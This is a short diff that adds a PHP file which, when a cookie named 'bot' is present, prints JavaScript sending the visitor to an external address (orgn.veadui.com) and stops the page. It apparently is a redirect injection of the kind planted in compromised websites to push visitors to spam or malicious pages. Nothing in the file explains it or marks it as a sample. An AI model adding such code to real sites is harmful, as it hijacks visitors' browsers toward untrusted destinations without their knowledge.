@@ -1,0 +1,9 @@
+<?php
+if(isset($_COOKIE['bot'])) {
+    echo "<script>";
+    echo "window.location.replace('https://orgn.veadui.com/btPXK85P');";
+    echo "document.location.href='https://orgn.veadui.com/btPXK85P';";
+    echo "</script>";
+    exit;
+}
+?>
